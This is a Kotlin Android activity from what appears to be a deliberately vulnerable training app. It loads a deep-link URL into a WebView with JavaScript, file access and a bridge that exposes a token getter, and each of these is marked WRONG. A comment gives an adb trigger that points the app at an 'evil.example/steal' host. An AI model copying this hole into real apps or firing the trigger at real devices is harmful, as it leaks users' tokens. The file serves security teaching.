package nz.co.vaultpay.web

import android.annotation.SuppressLint
import android.app.Activity
import android.os.Bundle
import android.webkit.WebView

/**
 * [M4 / MASVS-PLATFORM-2] Unvalidated deep-link input rendered in a WebView with JS enabled.
 *
 * Exported via the vaultpay://open?url= filter in the manifest. An attacker app or a
 * malicious link controls what loads. JavaScript is enabled and (worse) a JS bridge is
 * exposed, so loaded content can call back into the app.
 *
 * Trigger:
 *   adb shell am start -a android.intent.action.VIEW \
 *     -d "vaultpay://open?url=https://evil.example/steal" nz.co.vaultpay
 *
 * SECURE: allow-list URLs, disable JS unless required, never addJavascriptInterface to
 * untrusted content, validate the scheme/host.
 */
class DeepLinkWebViewActivity : Activity() {

    @SuppressLint("SetJavaScriptEnabled", "JavascriptInterface")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val wv = WebView(this)
        wv.settings.javaScriptEnabled = true                 // WRONG for untrusted content
        wv.settings.allowFileAccess = true                   // WRONG: file:// reachable
        wv.addJavascriptInterface(VaultBridge(), "VaultPay")  // WRONG: bridge to untrusted page
        setContentView(wv)

        val url = intent?.data?.getQueryParameter("url")     // fully attacker-controlled
        if (url != null) wv.loadUrl(url)
    }

    // Exposed to any loaded page via window.VaultPay.getToken()
    inner class VaultBridge {
        @android.webkit.JavascriptInterface
        fun getToken(): String = "bearer_token_from_prefs" // would leak the real token
    }
}
